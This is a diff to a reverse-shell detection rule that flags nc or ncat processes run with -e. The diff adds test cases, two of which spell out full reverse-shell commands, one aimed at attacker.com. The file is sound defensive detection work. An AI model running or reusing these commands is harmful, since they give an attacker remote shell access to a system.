@@ -1,4 +1,21 @@
 name: reverse_shell_nc
+mode: alert
 eval: (e.process_name == "nc" || e.process_name == "ncat") &&
       e.process_args.contains("-e") &&
       e.event_category == "process"
+tests:
+  - cleartext: "nc 10.0.0.1 4444 -e /bin/bash"
+    process_name: nc
+    process_args: "nc 10.0.0.1 4444 -e /bin/bash"
+    event_category: process
+    should_match: true
+  - cleartext: "ncat -e /bin/sh attacker.com 9001"
+    process_name: ncat
+    process_args: "ncat -e /bin/sh attacker.com 9001"
+    event_category: process
+    should_match: true
+  - cleartext: "nc -l 8080 (no -e flag)"
+    process_name: nc
+    process_args: "nc -l 8080"
+    event_category: process
+    should_match: false
